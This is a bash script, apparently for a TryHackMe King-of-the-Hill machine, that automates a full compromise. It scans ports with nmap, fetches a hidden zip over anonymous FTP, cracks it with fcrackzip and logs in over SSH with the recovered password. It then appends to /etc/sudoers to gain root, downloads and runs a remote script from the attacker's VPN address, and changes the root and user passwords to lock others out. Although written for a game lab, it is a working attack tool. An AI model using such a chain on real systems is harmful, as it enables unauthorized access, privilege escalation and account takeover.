#!/bin/bash

# Created by @0xVoid :)

# https://github.com/0x76OID/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing nmap
missing fcrackzip
missing unzip
missing sshpass

rm -rf boot 2>/dev/null
rm -rf file.zip 2>/dev/null

while getopts ":i:u:p:w:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
    w) Wordlist="$OPTARG" ;;
  esac
done

if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ] || [ -z "$Wordlist" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password' -w 'Wordlist Path'"
  exit 1
fi


# Note: You can replace the 'nmap' tool with any other network scanning tool of your choice. 
nmap_result=$(nmap -sV -p 1-20000 -T4 --min-rate 20000 "$IP")

SSH_PORT=$(echo "$nmap_result" | grep 'ssh' | awk '{print $1}' | cut -d '/' -f 1)
FTP_PORT=$(echo "$nmap_result" | grep 'ftp' | awk '{print $1}' | cut -d '/' -f 1)


if [ -z "$FTP_PORT" ] || [ -z "$SSH_PORT" ]; then
  echo "Try again."
  exit 1
fi


wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip 

PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')

unzip -P $PASSWORD file.zip 

ssh_pass=$(cat boot/.pass | grep 'neville:' | cut -d ':' -f 2)

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PORT" << EOF

    sudo ip netns exec foo bash -c 'echo "neville ALL=(ALL:ALL) ALL" >> /etc/sudoers'
    sleep 1
    sudo su
    echo "$username" > /root/king.txt
    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
    echo "root:$new_password" | chpasswd
    echo "neville:$new_password" | chpasswd
    echo "draco:$new_password" | chpasswd
    echo "harry:$new_password" | chpasswd
    echo "hermione:$new_password" | chpasswd
EOF
